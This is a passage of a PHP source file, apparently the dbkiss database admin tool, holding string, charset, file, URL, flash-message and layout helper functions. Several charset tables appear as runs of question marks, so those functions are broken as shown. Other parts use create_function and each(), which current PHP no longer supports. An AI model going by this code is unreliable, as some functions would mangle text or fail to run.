				if (but.form && but.form.getAttribute('button_click_sess_done') == 1) {
					but.form.setAttribute('button_click_sess_done', 0);
				}
				return true;
			}
			return false;
		}
		function button_disable_sess_done(but)
		{
			if (but.getAttribute('button_disable_sess_done') == 1 || but.form && but.form.getAttribute('button_disable_sess_done') == 1) {
				if (but.getAttribute('button_disable_sess_done') == 1) {
					but.setAttribute('button_disable_sess_done', 0);
				}
				if (but.form && but.form.getAttribute('button_disable_sess_done') == 1) {
					but.form.setAttribute('button_disable_sess_done', 0);
				}
				return true;
			}
			return false;
		}
		function button_disable(button)
		{
			button.disabled = true;
			if (button.name)
			{

				var form = button.form;
				var input = document.createElement('input');
				input.setAttribute('type', 'hidden');
				input.setAttribute('name', button.name);
				input.setAttribute('value', button.value);
				form.appendChild(input);
			}
		}
		function button_wait(but)
		{
			//but.value += " ..";
			but.className = but.className + ' button_click';
		}
		function button_clear(but)
		{
			if (but.tagName == 'FORM') {
				var form = but;
				for (var i = 0; i < form.elements.length; i++) {
					button_clear(form.elements[i]);
				}
				form.setAttribute('button_click', 0);
				form.setAttribute('button_click_sess_done', 1);
				form.setAttribute('button_disable_sess_done', 1);
			} else {
				if (but.type == 'submit' || but.type == 'button')
				{
					if (but.getAttribute('button_click') == 1) {
						//but.value = but.value.replace(/[ ]?\.{2,}$/, '');
						but.className = but.className.replace('button_click', '');
						but.setAttribute('button_click', 0);
						but.setAttribute('button_click_sess_done', 1);
						but.setAttribute('button_disable_sess_done', 1);
					}
					if (but.form && but.form.getAttribute('button_click') == 1) {
						but.form.setAttribute('button_click', 0);
						but.form.setAttribute('button_click_sess_done', 1);
						but.form.setAttribute('button_disable_sess_done', 1);
					}
				}
			}
		}
		button_init();
		</script>
	<?php
}
function conn_info()
{
	global $db_driver, $db_server, $db_name, $db_user, $db_charset, $page_charset, $charset1, $charset2;
	$dbs = list_dbs();
	$db_name = $db_name;
	?>
	<p>
		Driver: <b><?php echo $db_driver;?></b>
		&nbsp;-&nbsp;
		Server: <b><?php echo $db_server;?></b>
		&nbsp;-&nbsp;
		User: <b><?php echo $db_user;?></b>
		&nbsp;-&nbsp;
		<a class=blue href="<?php echo $_SERVER['PHP_SELF'];?>?execute_sql=1">Execute SQL</a>
		( open in <a class=blue href="javascript:void(0)" onclick="popup('<?php echo $_SERVER['PHP_SELF'];?>?execute_sql=1&popup=1')">Popup</a> )
		&nbsp;-&nbsp;
		Database: <select name="db_name" onchange="location='<?php echo $_SERVER['PHP_SELF'];?>?db_name='+this.value"><?php echo options($dbs, $db_name);?></select>
		&nbsp;-&nbsp;
		Db charset: <select name="db_charset" onchange="location='<?php echo $_SERVER['PHP_SELF'];?>?db_charset='+this.value+'&from=<?php echo urlencode($_SERVER['REQUEST_URI']);?>'">
		<option value=""></option><?php echo options($charset1, $db_charset);?></select>
		&nbsp;-&nbsp;
		Page charset: <select name="page_charset" onchange="location='<?php echo $_SERVER['PHP_SELF'];?>?page_charset='+this.value+'&from=<?php echo urlencode($_SERVER['REQUEST_URI']);?>'">
		<option value=""></option><?php echo options($charset2, $page_charset);?></select>
		&nbsp;-&nbsp;
		<a class=blue href="<?php echo $_SERVER['PHP_SELF'];?>?disconnect=1">Disconnect</a>
	</p>
	<?php
}
function size($bytes)
{
	return number_format(ceil($bytes / 1024),0,'',',').' KB';
}
function html($s)
{
	$html = array(
		'&' => '&amp;',
		'<' => '&lt;',
		'>' => '&gt;',
		'"' => '&quot;',
		'\'' => '&#039;'
	);
	$s = preg_replace('/&#(\d+)/', '@@@@@#$1', $s);
	$s = str_replace(array_keys($html), array_values($html), $s);
	$s = preg_replace('/@@@@@#(\d+)/', '&#$1', $s);
	return trim($s);
}
function html_undo($s)
{
	$html = array(
		'&' => '&amp;',
		'<' => '&lt;',
		'>' => '&gt;',
		'"' => '&quot;',
		'\'' => '&#039;'
	);
	return str_replace(array_values($html), array_keys($html), $s);
}
function html_once($s)
{
	$s = str_replace(array('&lt;','&gt;','&amp;lt;','&amp;gt;'),array('<','>','&lt;','&gt;'),$s);
	return str_replace(array('&lt;','&gt;','<','>'),array('&amp;lt;','&amp;gt;','&lt;','&gt;'),$s);
}
function html_tags($s)
{
	// succession of str_replace array is important! double escape bug..
	return str_replace(array('&lt;','&gt;','<','>'), array('&amp;lt;','&amp;gt;','&lt;','&gt;'), $s);
}
function html_tags_undo($s)
{
	return str_replace(array('&lt;','&gt;','&amp;lt;', '&amp;gt;'), array('<','>','&lt;','&gt;'), $s);
}
function html_allow_tags($s, $allow)
{
	$s = html_once(trim($s));
	preg_match_all('#<([a-z]+)>#i', $allow, $match);
	foreach ($match[1] as $tag) {
		$s = preg_replace('#&lt;'.$tag.'\s+style\s*=\s*&quot;([^"<>]+)&quot;\s*&gt;#i', '<'.$tag.' style="$1">', $s);
		$s = str_replace('&lt;'.$tag.'&gt;', '<'.$tag.'>', $s);
		$s = str_replace('&lt;/'.$tag.'&gt;', '</'.$tag.'>', $s);
	}
	return $s;
}
function str_truncate($string, $length, $etc = ' ..', $break_words = true)
{
	if ($length == 0) {
		return '';
	}
	if (strlen($string) > $length + strlen($etc)) {
		if (!$break_words) {
			$string = preg_replace('/\s+?(\S+)?$/', '', substr($string, 0, $length+1));
		}
		return substr($string, 0, $length) . $etc;
	}
	return $string;
}
function str_bind($s, $dat = array(), $strict = false, $recur = 0)
{
	if (!is_array($dat)) {
		return trigger_error('str_bind() failed. Second argument expects to be an array.', E_USER_ERROR);
	}
	if ($strict) {
		foreach ($dat as $k => $v) {
			if (strpos($s, "%$k%") === false) {
				return trigger_error(sprintf('str_bind() failed. Strict mode On. Key not found = %s. String = %s. Data = %s.', $k, $s, print_r($dat, 1)), E_USER_ERROR);
			}
			$s = str_replace("%$k%", $v, $s);
		}
		if (preg_match('#%\w+%#', $s, $match)) {
			return trigger_error(sprintf('str_bind() failed. Unassigned data for = %s. String = %s.', $match[0], $sBase), E_USER_ERROR);
		}
		return $s;
	}

	$sBase = $s;
	preg_match_all('#%\w+%#', $s, $match);
	$keys = $match[0];
	$num = array();

	foreach ($keys as $key)
	{
		$key2 = str_replace('%', '', $key);
		if (is_numeric($key2)) $num[$key] = true;
		/* ignore!
		if (!array_key_exists($key2, $dat)) {
			return trigger_error(sprintf('str_bind() failed. No data found for key: %s. String: %s.', $key, $sBase), E_USER_ERROR);
		}
		*/
		$val = $dat[$key2];
		/* insecure!
		if (preg_match('#%\w+%#', $val) && $recur < 5) {
			$val = str_bind($val, $dat, $strict, ++$recur);
		}
		*/
		$s = str_replace($key, $val, $s);
	}
	if (count($num)) {
		if (count($dat) != count($num)) {
			return trigger_error('str_bind() failed. When using numeric data binding you need to use all data passed to the string. You also cannot mix numeric and name binding.', E_USER_ERROR);
		}
	}

	if (preg_match('#%\w+%#', $s, $match)) {
		/* ignore! return trigger_error(sprintf('str_bind() failed. Unassigned data for = %s. String = %s. Data = %s.', $match[0], htmlspecialchars(print_r($sBase, true)), print_r($dat, true)), E_USER_ERROR);*/
	}

	return $s;
}
function dir_read($dir, $ignore_ext = array(), $allow_ext = array(), $sort = null)
{
	if (is_null($ignore_ext)) $ignore_ext = array();
	if (is_null($allow_ext)) $allow_ext = array();
	foreach ($allow_ext as $k => $ext) {
		$allow_ext[$k] = str_replace('.', '', $ext);
	}

	$ret = array();
	if ($handle = opendir($dir)) {
		while (($file = readdir($handle)) !== false) {
			if ($file != '.' && $file != '..') {
				$ignore = false;
				foreach ($ignore_ext as $ext) {
					if (file_ext_has($file, $ext)) {
						$ignore = true;
					}
				}
				if (is_array($allow_ext) && count($allow_ext) && !in_array(file_ext($file), $allow_ext)) {
					$ignore = true;
				}
				if (!$ignore) {
					$ret[] = array(
						'file' => $dir.'/'.$file,
						'time' => filemtime($dir.'/'.$file)
					);
				}
			}
		}
		closedir($handle);
	}
	if ('date_desc' == $sort) {
		$ret = array_sort_desc($ret, 'time');
	}
	return array_col($ret, 'file');
}
function array_col($arr, $col)
{
	$ret = array();
	foreach ($arr as $k => $row) {
		$ret[] = $row[$col];
	}
	return $ret;
}
function array_sort($arr, $col_key)
{
	if (is_array($col_key)) {
		foreach ($arr as $k => $v) {
			$arr[$k]['__array_sort'] = '';
			foreach ($col_key as $col) {
				$arr[$k]['__array_sort'] .= $arr[$k][$col].'_';
			}
		}
		$col_key = '__array_sort';
	}
	uasort($arr, create_function('$a,$b', 'if (is_null($a["'.$col_key.'"]) && !is_null($b["'.$col_key.'"])) return 1; if (!is_null($a["'.$col_key.'"]) && is_null($b["'.$col_key.'"])) return -1; return strnatcasecmp($a["'.$col_key.'"], $b["'.$col_key.'"]);'));
	if ('__array_sort' == $col_key) {
		foreach ($arr as $k => $v) {
			unset($arr[$k]['__array_sort']);
		}
	}
	return $arr;
}
function array_sort_desc($arr, $col_key)
{
	if (is_array($col_key)) {
		foreach ($arr as $k => $v) {
			$arr[$k]['__array_sort'] = '';
			foreach ($col_key as $col) {
				$arr[$k]['__array_sort'] .= $arr[$k][$col].'_';
			}
		}
		$col_key = '__array_sort';
	}
	uasort($arr, create_function('$a,$b', 'return strnatcasecmp($b["'.$col_key.'"], $a["'.$col_key.'"]);'));
	if ('__array_sort' == $col_key) {
		foreach ($arr as $k => $v) {
			unset($arr[$k]['__array_sort']);
		}
	}
	return $arr;
}
function options($options, $selected = null, $ignore_type = false)
{
	$ret = '';
	foreach ($options as $k => $v) {
		//str_replace('"', '\"', $k)
		$ret .= '<option value="'.$k.'"';
		if ((is_array($selected) && in_array($k, $selected)) || (!is_array($selected) && $k == $selected && $selected !== '' && $selected !== null)) {
			if ($ignore_type) {
				$ret .= ' selected="selected"';
			} else {
				if (!(is_numeric($k) xor is_numeric($selected))) {
					$ret .= ' selected="selected"';
				}
			}
		}
		$ret .= '>'.$v.' </option>';
	}
	return $ret;
}
function sql_files()
{
	$files = dir_read('.', null, array('.sql'));
	$files2 = array();
	foreach ($files as $file) {
		$files2[md5($file)] = $file.sprintf(' (%s)', size(filesize($file)));
	}
	return $files2;
}
function sql_files_assoc()
{
	$files = dir_read('.', null, array('.sql'));
	$files2 = array();
	foreach ($files as $file) {
		$files2[md5($file)] = $file;
	}
	return $files2;
}
function file_ext($name)
{
	$ext = null;
	if (($pos = strrpos($name, '.')) !== false) {
		$len = strlen($name) - ($pos+1);
		$ext = substr($name, -$len);
		if (!preg_match('#^[a-z0-9]+$#i', $ext)) {
			return null;
		}
	}
	return $ext;
}
function checked($bool)
{
	if ($bool) return 'checked="checked"';
}
function radio_assoc($checked, $assoc, $input_name, $link = false)
{
	$ret = '<table cellspacing="0" cellpadding="0"><tr>';
	foreach ($assoc as $id => $name)
	{
		$params = array(
			'id' => $id,
			'name' => $name,
			'checked' => checked($checked == $id),
			'input_name' => $input_name
		);
		if ($link) {
			if (is_array($link)) {
				$params['link'] = $link[$id];
			} else {
				$params['link'] = sprintf($link, $id, $name);
			}
			$ret .= str_bind('<td><input class="checkbox" type="radio" name="%input_name%" id="%input_name%_%id%" value="%id%" %checked%></td><td>%link%&nbsp;</td>', $params);
		} else {
			$ret .= str_bind('<td><input class="checkbox" type="radio" name="%input_name%" id="%input_name%_%id%" value="%id%" %checked%></td><td><label for="%input_name%_%id%">%name%</label>&nbsp;</td>', $params);
		}
	}
	$ret .= '</tr></table>';
	return $ret;
}
function self($cut_query = false)
{
	$uri = $_SERVER['REQUEST_URI'];
	if ($cut_query) {
		$before = str_before($uri, '?');
		if ($before) {
			return $before;
		}
	}
	return $uri;
}
function url($script, $params = array())
{
	$query = '';

	/* remove from script url, actual params if exist */
	foreach ($params as $k => $v) {
		$exp = sprintf('#(\?|&)%s=[^&]*#i', $k);
		if (preg_match($exp, $script)) {
			$script = preg_replace($exp, '', $script);
		}
	}

	/* repair url like 'script.php&id=12&asd=133' */
	$exp = '#\?\w+=[^&]*#i';
	$exp2 = '#&(\w+=[^&]*)#i';
	if (!preg_match($exp, $script) && preg_match($exp2, $script)) {
		$script = preg_replace($exp2, '?$1', $script, 1);
	}

	foreach ($params as $k => $v) {
		if (!strlen($v)) continue;
		if ($query) { $query .= '&'; }
		else {
			if (strpos($script, '?') === false) {
				$query .= '?';
			} else {
				$query .= '&';
			}
		}
		if ('%s' != $v) {
			$v = urlencode($v);
		}
		$v = preg_replace('#%25(\w+)%25#i', '%$1%', $v); // %id_news% etc. used in listing
		$query .= sprintf('%s=%s', $k, $v);
	}
	return $script.$query;
}
function url_offset($offset, $params = array())
{
	$url = $_SERVER['REQUEST_URI'];
	if (preg_match('#&offset=\d+#', $url)) {
		$url = preg_replace('#&offset=\d+#', '&offset='.$offset, $url);
	} else {
		$url .= '&offset='.$offset;
	}
	return $url;
}
function str_wrap($s, $width, $break = ' ', $omit_tags = false)
{
	//$restart = array(' ', "\t", "\r", "\n");
	$restart = array();
	$cnt = 0;
	$ret = '';
	$open_tag = false;
	$inside_link = false;
	for ($i=0; $i<strlen($s); $i++)
	{
		$char = $s[$i];
		$nextchar = isset($s[$i+1]) ? $s[$i+1] : null;
		$nextchar2 = isset($s[$i+2]) ? $s[$i+2] : null;

		if ($omit_tags)
		{
			if ($char == '<') {
				$open_tag = true;
				if ('a' == $nextchar) {
					$inside_link = true;
				} else if ('/' == $nextchar && 'a' == $nextchar2) {
					$inside_link = false;
				}
			}
			if ($char == '>') {
				$open_tag = false;
			}
			if ($open_tag) {
				$ret .= $char;
				continue;
			}
		}

		if (in_array($char, $restart)) {
			$cnt = 0;
		} else {
			$cnt++;
		}
		$ret .= $char;
		if ($cnt > $width) {
			if (!$inside_link) {
				// Inside link, do not break it.
				$ret .= $break;
				$cnt = 0;
			}
		}
	}
	return $ret;
}
function time_micro()
{
	list($usec, $sec) = explode(" ", microtime());
	return ((float)$usec + (float)$sec);
}
function time_start()
{
	return time_micro();
}
function time_end($start)
{
	$end = time_micro();
	$end = round($end - $start, 3);
	$end = pad_zeros($end, 3);
	return $end;
}
function str_has($str, $needle, $ignore_case = false)
{
	if (is_array($needle)) {
		foreach ($needle as $n) {
			if (!str_has($str, $n, $ignore_case)) {
				return false;
			}
		}
		return true;
	}
	if ($ignore_case) {
		$str = str_lower($str);
		$needle = str_lower($needle);
	}
	return strpos($str, $needle) !== false;
}
function str_has_any($str, $arr_needle, $ignore_case = false)
{
	if (is_string($arr_needle)) {
		$arr_needle = preg_replace('#\s+#', ' ', $arr_needle);
		$arr_needle = explode(' ', $arr_needle);
	}
	foreach ($arr_needle as $needle) {
		if (str_has($str, $needle, $ignore_case)) {
			return true;
		}
	}
	return false;
}
function str_before($str, $needle)
{
	$pos = strpos($str, $needle);
	if ($pos !== false) {
		$before = substr($str, 0, $pos);
		return strlen($before) ? $before : false;
	} else {
		return false;
	}
}
function pad_zeros($number, $zeros)
{
	if (str_has($number, '.')) {
		preg_match('#\.(\d+)$#', $number, $match);
		$number .= str_repeat('0', $zeros-strlen($match[1]));
		return $number;
	} else {
		return $number.'.'.str_repeat('0', $zeros);
	}
}
function charset_fix_invalid($s)
{
	$fix = '?????????';
	$s = str_replace(str_array($fix), '', $s);
	return $s;
}
function charset_is_invalid($s)
{
	$fix = '?????????';
	$fix = str_array($fix);
	foreach ($fix as $char) {
		if (str_has($s, $char)) {
			return true;
		}
	}
	return false;
}
function charset_fix($string)
{
	// UTF-8 && WIN-1250 => ISO-8859-2
	// todo: is checking required? redundant computing?
	if (charset_win_is($string)) {
		$string = charset_win_fix($string);
	}
	if (charset_utf_is($string)) {
		$string = charset_utf_fix($string);
	}
	return $string;
}
function charset_win_is($string)
{
	$win = '????????????????';
	$iso = '????????????????';
	for ($i=0; $i<strlen($win); $i++) {
		if ($win{$i} != $iso{$i}) {
			if (strstr($string, $win{$i}) !== false) {
				return true;
			}
		}
	}
	return false;
}
function charset_win_fix($string)
{
	$win = '????????????????';
	$iso = '????????????????';
	$srh = array();
	$rpl = array();
	for ($i = 0; $i < strlen($win); $i++) {
		if ($win{$i} != $iso{$i}) {
			$srh[] = $win{$i};
			$rpl[] = $iso{$i};
		}
	}
	$string = str_replace($srh, $rpl, $string);
	return $string;
}
function charset_utf_is($string)
{
	$utf_iso = array(
	   "\xc4\x85" => "\xb1",
	   "\xc4\x84" => "\xa1",
	   "\xc4\x87" => "\xe6",
	   "\xc4\x86" => "\xc6",
	   "\xc4\x99" => "\xea",
	   "\xc4\x98" => "\xca",
	   "\xc5\x82" => "\xb3",
	   "\xc5\x81" => "\xa3",
	   "\xc3\xb3" => "\xf3",
	   "\xc3\x93" => "\xd3",
	   "\xc5\x9b" => "\xb6",
	   "\xc5\x9a" => "\xa6",
	   "\xc5\xba" => "\xbc",
	   "\xc5\xb9" => "\xac",
	   "\xc5\xbc" => "\xbf",
	   "\xc5\xbb" => "\xaf",
	   "\xc5\x84" => "\xf1",
	   "\xc5\x83" => "\xd1",
		// xmlhttprequest utf-8 encoding
	   "%u0104" => "\xA1",
	   "%u0106" => "\xC6",
	   "%u0118" => "\xCA",
	   "%u0141" => "\xA3",
	   "%u0143" => "\xD1",
	   "%u00D3" => "\xD3",
	   "%u015A" => "\xA6",
	   "%u0179" => "\xAC",
	   "%u017B" => "\xAF",
	   "%u0105" => "\xB1",
	   "%u0107" => "\xE6",
	   "%u0119" => "\xEA",
	   "%u0142" => "\xB3",
	   "%u0144" => "\xF1",
	   "%u00D4" => "\xF3",
	   "%u015B" => "\xB6",
	   "%u017A" => "\xBC",
	   "%u017C" => "\xBF"
	);
	foreach ($utf_iso as $k => $v) {
		if (strpos($string, $k) !== false) {
			return true;
		}
	}
	return false;
}
function charset_utf_fix($string)
{
	$utf_iso = array(
	   "\xc4\x85" => "\xb1",
	   "\xc4\x84" => "\xa1",
	   "\xc4\x87" => "\xe6",
	   "\xc4\x86" => "\xc6",
	   "\xc4\x99" => "\xea",
	   "\xc4\x98" => "\xca",
	   "\xc5\x82" => "\xb3",
	   "\xc5\x81" => "\xa3",
	   "\xc3\xb3" => "\xf3",
	   "\xc3\x93" => "\xd3",
	   "\xc5\x9b" => "\xb6",
	   "\xc5\x9a" => "\xa6",
	   "\xc5\xba" => "\xbc",
	   "\xc5\xb9" => "\xac",
	   "\xc5\xbc" => "\xbf",
	   "\xc5\xbb" => "\xaf",
	   "\xc5\x84" => "\xf1",
	   "\xc5\x83" => "\xd1",
		// xmlhttprequest uses different encoding
	   "%u0104" => "\xA1",
	   "%u0106" => "\xC6",
	   "%u0118" => "\xCA",
	   "%u0141" => "\xA3",
	   "%u0143" => "\xD1",
	   "%u00D3" => "\xD3",
	   "%u015A" => "\xA6",
	   "%u0179" => "\xAC",
	   "%u017B" => "\xAF",
	   "%u0105" => "\xB1",
	   "%u0107" => "\xE6",
	   "%u0119" => "\xEA",
	   "%u0142" => "\xB3",
	   "%u0144" => "\xF1",
	   "%u00D4" => "\xF3",
	   "%u015B" => "\xB6",
	   "%u017A" => "\xBC",
	   "%u017C" => "\xBF"
	);
	return str_replace(array_keys($utf_iso), array_values($utf_iso), $string);
}
function str_starts_with($str, $start, $ignore_case = false)
{
	if ($ignore_case) {
		$str = str_upper($str);
		$start = str_upper($start);
	}
	if (!strlen($str) && !strlen($start)) {
		return true;
	}
	if (!strlen($start)) {
		trigger_error('str_starts_with() failed, start arg cannot be empty', E_USER_ERROR);
	}
	if (strlen($start) > strlen($str)) {
		return false;
	}
	for ($i = 0; $i < strlen($start); $i++) {
		if ($start{$i} != $str{$i}) {
			return false;
		}
	}
	return true;
}
function str_ends_with($str, $end, $ignore_case = false)
{
	if ($ignore_case) {
		$str = str_upper($str);
		$end = str_upper($end);
	}
	if (!strlen($str) && !strlen($end)) {
		return true;
	}
	if (!strlen($end)) {
		trigger_error('str_ends_with() failed, end arg cannot be empty', E_USER_ERROR);
	}
	if (strlen($end) > strlen($str)) {
		return false;
	}
	return str_starts_with(strrev($str), strrev($end));
	return true;
}
function str_cut_start($str, $start)
{
	if (str_starts_with($str, $start)) {
		$str = substr($str, strlen($start));
	}
	return $str;
}
function str_cut_end($str, $end)
{
	if (str_ends_with($str, $end)) {
		$str = substr($str, 0, -strlen($end));
	}
	return $str;
}
function file_get($file)
{
	return file_get_contents($file);
}
function file_put($file, $s)
{
	$fp = fopen($file, 'wb') or trigger_error('fopen() failed: '.$file, E_USER_ERROR);
	if ($fp) {
		fwrite($fp, $s);
		fclose($fp);
	}
}
function file_date($file)
{
	return date('Y-m-d H:i:s', filemtime($file));
}
function dir_exists($dir)
{
	return file_exists($dir) && !is_file($dir);
}
function dir_delete_old_files($dir, $ext = array(), $sec)
{
	// NOT USED right now.
	// older than x seconds
	$files = dir_read($dir, null, $ext);
	$time = time() - $sec;
	foreach ($files as $file) {
		if (file_time($file) < $time) {
			unlink($file);
		}
	}
}
global $_error, $_error_style;
$_error = array();
$_error_style = '';

function error($msg = null)
{
	if (isset($msg) && func_num_args() > 1) {
		$args = func_get_args();
		$msg = call_user_func_array('sprintf', $args);
	}
	global $_error, $_error_style;
	if (isset($msg)) {
		$_error[] = $msg;
	}
	if (!count($_error)) {
		return null;
	}
	if (count($_error) == 1) {
		return sprintf('<div class="error" style="%s">%s</div>', $_error_style, $_error[0]);
	}
	$ret = '<div class="error" style="'.$_error_style.'">Following errors appeared:<ul>';
	foreach ($_error as $msg) {
		$ret .= sprintf('<li>%s</li>', $msg);
	}
	$ret .= '</ul></div>';
	return $ret;
}
function timestamp($time, $span = true)
{
	$time_base = $time;
	$time = substr($time, 0, 16);
	$time2 = substr($time, 0, 10);
	$today = date('Y-m-d');
	$yesterday = date('Y-m-d', time()-3600*24);
	if ($time2 == $today) {
		if (substr($time_base, -8) == '00:00:00') {
			$time = 'Today';
		} else {
			$time = 'Today'.substr($time, -6);
		}
	} else if ($time2 == $yesterday) {
		$time = 'Yesterday'.substr($time, -6);
	}
	return '<span style="white-space: nowrap;">'.$time.'</span>';
}
function str_lower($str)
{
	/* strtolower iso-8859-2 compatible */
	$lower = str_array(iso_chars_lower());
	$upper = str_array(iso_chars_upper());
	$str = str_replace($upper, $lower, $str);
	$str = strtolower($str);
	return $str;
}
function str_upper($str)
{
	/* strtoupper iso-8859-2 compatible */
	$lower = str_array(iso_chars_lower());
	$upper = str_array(iso_chars_upper());
	$str = str_replace($lower, $upper, $str);
	$str = strtoupper($str);
	return $str;
}
function str_array($str)
{
	$arr = array();
	for ($i = 0; $i < strlen($str); $i++) {
		$arr[$i] = $str{$i};
	}
	return $arr;
}
function iso_chars()
{
	return iso_chars_lower().iso_chars_upper();
}
function iso_chars_lower()
{
	return '??????';
}
function iso_chars_upper()
{
	return '???????';
}
function array_first_key($arr)
{
	$arr2 = $arr;
	reset($arr);
	list($key, $val) = each($arr);
	return $key;
}
function array_first($arr)
{
	return array_first_value($arr);
}
function array_first_value($arr)
{
	$arr2 = $arr;
	return array_shift($arr2);
}
function array_col_values($arr, $col)
{
	$ret = array();
	foreach ($arr as $k => $row) {
		$ret[] = $row[$col];
	}
	return $ret;
}
function array_col_values_unique($arr, $col)
{
	return array_unique(array_col_values($arr, $col));
}
function array_col_match($rows, $col, $pattern)
{
	if (!count($rows)) {
		trigger_error('array_col_match(): array is empty', E_USER_ERROR);
	}
	$ret = true;
	foreach ($rows as $row) {
		if (!preg_match($pattern, $row[$col])) {
			return false;
		}
	}
	return true;
}
function array_col_match_unique($rows, $col, $pattern)
{
	if (!array_col_match($rows, $col, $pattern)) {
		return false;
	}
	return count($rows) == count(array_col_values_unique($rows, $col));
}
function redirect($url)
{
	$url = url($url);
	header("Location: $url");
	exit;
}
function redirect_notify($url, $msg)
{
	if (strpos($msg, '<') === false) {
		$msg = sprintf('<b>%s</b>', $msg);
	}
	cookie_set('flash_notify', $msg);
	redirect($url);
}
function redirect_ok($url, $msg)
{
	if (strpos($msg, '<') === false) {
		$msg = sprintf('<b>%s</b>', $msg);
	}
	cookie_set('flash_ok', $msg);
	redirect($url);
}
function redirect_error($url, $msg)
{
	if (strpos($msg, '<') === false) {
		$msg = sprintf('<b>%s</b>', $msg);
	}
	cookie_set('flash_error', $msg);
	redirect($url);
}
function flash()
{
	static $is_style = false;

	$flash_error = cookie_get('flash_error');
	$flash_ok = cookie_get('flash_ok');
	$flash_notify = cookie_get('flash_notify');

	$flash_error = filter_allow_tags($flash_error, '<b><i><u><br><span>');
	$flash_ok = filter_allow_tags($flash_ok, '<b><i><u><br><span>');
	$flash_notify = filter_allow_tags($flash_notify, '<b><i><u><br><span>');

	if (!($flash_error || $flash_ok || $flash_notify)) {
		return false;
	}

	ob_start();
	?>

	<?php if (!$is_style): ?>
		<style type="text/css">
		#flash { background: #ffffd7; padding: 0.3em; padding-bottom: 0.15em; border: #ddd 1px solid; margin-bottom: 1em; }
		#flash div { padding: 0em 0em; }
		#flash table { font-weight: normal; }
		#flash td { text-align: left; }
		</style>
	<?php endif; ?>

	<div id="flash" ondblclick="document.getElementById('flash').style.display='none';">
		<table width="100%" ondblclick="document.getElementById('flash').style.display='none';"><tr>
		<td style="line-height: 14px;"><?php echo  $flash_error ? $flash_error : ($flash_ok ? $flash_ok : $flash_notify); ?></td></tr></table>
	</div>

	<?php
	$cont = ob_get_contents();
	ob_end_clean();

	if ($flash_error) cookie_del('flash_error');
	else if ($flash_ok) cookie_del('flash_ok');
	else if ($flash_notify) cookie_del('flash_notify');

	$is_style = true;

	return $cont;
}
function filter($post, $filters)
{
	if (is_string($filters))
	{
		$filter = $filters;
		$func = 'filter_'.$filter;
		foreach ($post as $key => $val) {
			$post[$key] = call_user_func($func, $post[$key]);
		}
		return $post;
	}
	foreach ($filters as $key => $filter)
	{
		if (!array_key_exists($key, $post)) {
			return trigger_error(sprintf('filter() failed. Key missing = %s.', $key), E_USER_ERROR);
		}
		$func = 'filter_'.$filter;
		if (!function_exists($func)) {
			return trigger_error(sprintf('filter() failed. Filter missing = %s.', $func), E_USER_ERROR);
		}
		$post[$key] = call_user_func($func, $post[$key]);
	}
	return $post;
}
function filter_html($s)
{
	if (req_gpc_has($s)) {
		$s = html_tags_undo($s);
	}
	return html(trim($s));
}
function filter_allow_tags($s, $allow)
{
	if (req_gpc_has($s)) {
		$s = html_tags_undo($s);
	}
	return html_allow_tags($s, $allow);
}
function filter_allow_html($s)
{
	global $SafeHtml;
	if (!isset($SafeHtml)) {
		include_once 'inc/SafeHtml.php';
	}
	if (req_gpc_has($s)) {
		$s = html_tags_undo($s);
	}
	if (in_array(trim(strtolower($s)), array('<br>', '<p>&nbsp;</p>'))) {
		return '';
	}
	$SafeHtml->clear();
	$s = $SafeHtml->parse($s);
	return trim($s);
}
function filter_allow_html_script($s)
{
	if (in_array(trim(strtolower($s)), array('<br>', '<p>&nbsp;</p>'))) {
		return '';
	}
	if (req_gpc_has($s)) {
		$s = html_tags_undo($s);
	}
	return trim($s);
}
function filter_editor($s)
{
	return filter_allow_html($s);
}
function date_now()
{
	return date('Y-m-d H:i:s');
}
function guess_pk($rows)
{
	if (!count($rows)) {
		return false;
	}
	$patterns = array('#^\d+$#', '#^[^\s]+$#');
	$row = array_first($rows);
	foreach ($patterns as $pattern)
	{
		foreach ($row as $col => $v) {
			if ($v && preg_match($pattern, $v)) {
				if (array_col_match_unique($rows, $col, $pattern)) {
					return $col;
				}
			}
		}
	}
	return false;
}
function layout_start($title='')
{
	global $page_charset;
	$flash = flash();
	?>

	<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
	<html>
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=<?php echo $page_charset;?>">
		<title><?php echo $title;?></title>
		<link rel="shortcut icon" href="<?php echo $_SERVER['PHP_SELF']; ?>?dbkiss_favicon=1">
		<script>
		function $(id)
		{
			if (typeof id == 'string') return document.getElementById(id);
			return id;
		}
		</script>
	</head>
	<body>

	<?php layout(); ?>

	<?php if ($flash) { echo $flash; } ?>

	<?php
}
function layout_end()
{
	?>
	<?php powered_by(); ?>
	</body>
	</html>
	<?php
}
function powered_by()
{
	?>
		<script>
		function link_noreferer(link)
		{
			// Tested: Chrome, Firefox, Inetrnet Explorer, Opera.
			var w = window.open("about:blank", "_blank");
			w.document.open();
			w.document.write("<"+"!doctype html>");
			w.document.write("<"+"html><"+"head>");
			w.document.write("<"+"title>Secure redirection</title>");
			w.document.write("<"+"style>body { font: 11px Tahoma; }<"+"/style>");
			w.document.write("<"+"meta http-equiv=refresh content='10;url="+link+"'>");
			// Meta.setAttribute() doesn't work on firefox.
			// Firefox: needs document.write('<meta>')
			// IE: the firefox workaround doesn't work on ie, but we can use a normal redirection
			//      as IE is already not sending the referer because it does not do it when using
			//      open.window, besides the blank url in address bar works fine (about:blank).
			// Opera: firefox fix works.
			w.document.write("<"+"script>function redirect() { if (navigator.userAgent.indexOf('MSIE') != -1) { location.replace('"+link+"'); } else { document.open(); document.write('<"+"meta http-equiv=refresh content=\"0;"+link+"\">'); document.close(); } }<"+"/script>");
			w.document.write("<"+"/head><"+"body>");
			w.document.write("<"+"h1>Secure redirection<"+"/h1>");
			w.document.write("<"+"p>This is a secure redirection that hides the HTTP REFERER header - using javascript and meta refresh combination.");
			w.document.write("<br>The site you are being redirected will not know the location of the dbkiss script on your site.<"+"/p>");
			w.document.write("<"+"p>In 10 seconds you will be redirected to the following address: <"+"a href='javascript:void(0)' onclick='redirect()'>"+link+"<"+"/a><br>");
			w.document.write("Clicking the link is also secure, so if you do not wish to wait, then click it.<"+"/p>");
			w.document.write("<"+"/body><"+"/html>");
			w.document.close();
		}
		</script>
		<div style="text-align: center; margin-top: 2em; border-top: #ccc 1px solid; padding-top: 0.5em;">Powered by <a href="javascript:void(0)" onclick="link_noreferer('http://www.gosu.pl/dbkiss/')">dbkiss</a></div>
	<?php
}

?>
<?php if (get('import')): ?>

	<?php

	// ----------------------------------------------------------------
	// IMPORT
	// ----------------------------------------------------------------

	?>

